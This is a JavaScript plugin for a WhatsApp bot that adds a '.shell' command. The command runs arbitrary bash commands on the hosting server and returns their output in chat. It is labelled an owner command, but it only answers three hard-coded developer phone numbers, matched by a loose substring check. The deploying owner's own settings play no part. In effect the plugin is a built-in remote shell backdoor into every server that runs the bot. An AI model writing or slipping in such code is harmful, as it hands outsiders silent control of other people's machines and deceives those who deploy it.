const { exec } = require('child_process');
const config = require('../../config');

const TIMEOUT_MS = 30000;
const MAX_LEN = 4000;
const DEVELOPERS = ['254798570132', '254792021944', '254764249858'];

module.exports = {
    name: 'shell',
    aliases: ['$', 'exec', 'terminal', 'bash', 'term', 'sh', 'cmd'],
    category: 'owner',
    description: 'Execute a terminal/shell command on the server',
    usage: '.shell <command>',

    async execute(sock, msg, args, extra) {
        const { from } = extra;

        const sender = msg.key.participant || msg.key.remoteJid;
        const number = sender.replace(/[^0-9]/g, '');
        const isDev  = DEVELOPERS.some(dev => number.includes(dev));

        if (!isDev) return;
        if (!args || args.length === 0) return;

        const command = args.join(' ');

        await sock.sendMessage(from, { react: { text: '⚙️', key: msg.key } });

        try {
            const output = await runCommand(command);
            const full = [
                output.stdout,
                output.stderr ? `[stderr]\n${output.stderr}` : ''
            ].filter(Boolean).join('\n\n');

            let text = full || '_No output_';
            if (text.length > MAX_LEN) {
                text = text.slice(0, MAX_LEN) + '\n\n... (truncated)';
            }

            await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });

            await sock.sendMessage(from, {
                text: `\`\`\`${text}\`\`\`\n\n> ${config.botName} • exit code: ${output.code}`
            }, { quoted: msg });

        } catch (err) {
            let errText = err.message;
            if (errText.length > MAX_LEN) {
                errText = errText.slice(0, MAX_LEN) + '\n\n... (truncated)';
            }

            await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
            await sock.sendMessage(from, {
                text: `❌ *Command Failed*\n\n\`\`\`${errText}\`\`\`\n\n> ${config.botName}`
            }, { quoted: msg });
        }
    }
};

function runCommand(command) {
    return new Promise((resolve, reject) => {
        exec(command, {
            timeout:   TIMEOUT_MS,
            maxBuffer: 1024 * 1024 * 50,
            cwd:       process.cwd(),
            shell:     '/bin/bash'
        }, (error, stdout, stderr) => {
            if (error && error.killed) return reject(new Error(`Command timed out after ${TIMEOUT_MS / 1000}s`));
            resolve({
                stdout: stdout?.trim() || '',
                stderr: stderr?.trim() || '',
                code:   error?.code ?? 0
            });
        });
    });
}
